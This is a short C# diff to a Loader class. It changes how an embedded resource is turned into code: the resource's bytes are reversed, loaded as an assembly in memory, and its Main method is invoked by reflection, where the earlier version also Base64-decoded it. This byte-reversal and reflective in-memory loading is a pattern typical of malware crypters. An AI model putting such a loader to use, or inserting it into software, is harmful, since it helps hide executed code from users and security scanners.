@@ -69,7 +69,7 @@ public partial class Loader
 
         try
         {
-            Assembly.Load(Convert.FromBase64String(Encoding.ASCII.GetString((byte[])new ResourceManager("#LoaderRes", Assembly.GetExecutingAssembly()).GetObject("#Program"))).Reverse().ToArray()).CreateInstance("Program").GetType().GetMethod("Main").Invoke(null, new object[0]);
+            Assembly.Load(((byte[])new ResourceManager("#LoaderRes", Assembly.GetExecutingAssembly()).GetObject("#Program")).Reverse().ToArray()).CreateInstance("Program").GetType().GetMethod("Main").Invoke(null, new object[0]);
         }
         catch (Exception ex)
         {
